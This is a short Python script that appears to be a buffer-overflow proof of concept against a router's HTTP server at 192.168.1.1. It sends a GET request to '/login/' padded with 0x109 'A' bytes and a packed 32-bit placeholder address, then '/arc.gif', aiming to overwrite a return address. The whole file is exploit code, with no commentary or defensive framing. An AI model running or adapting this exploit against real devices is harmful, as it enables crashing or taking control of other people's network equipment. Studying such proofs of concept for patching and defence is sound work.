import socket
import struct

from socket import htonl, htons

p32  = lambda n   : struct.pack('>I', n)

PORT = 80
IP   = "192.168.1.1"

io = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
io.connect((IP, PORT))
request = b'' \
+ b'GET /login/' + b'A'*0x109 + p32(0x12345678) + b'/arc.gif HTTP/1.1\r\n' \
+ b'Host: 192.168.1.1\r\n' \
+ b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n' \
+ b'\r\n'
io.send(request)
io.recv(4096)
io.close()